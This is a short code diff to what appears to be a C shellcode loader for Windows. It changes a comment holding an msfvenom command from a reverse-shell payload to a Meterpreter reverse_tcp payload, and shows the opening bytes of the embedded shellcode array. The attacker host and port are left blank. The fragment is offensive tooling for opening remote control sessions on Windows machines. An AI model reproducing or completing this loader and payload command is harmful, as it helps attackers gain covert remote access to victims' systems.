@@ -6,7 +6,7 @@
 
 #define EXIT_WITH_ERROR( e ) { printf( "%s - %d", e, GetLastError() );return 1;}
 
-//msfvenon -p windows/x64/shell_reverse_tcp lport= lhost= -f c
+//msfvenon -p windows/x64/meterpreter/reverse_tcp lport= lhost= -f c
 
 char shellcode[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
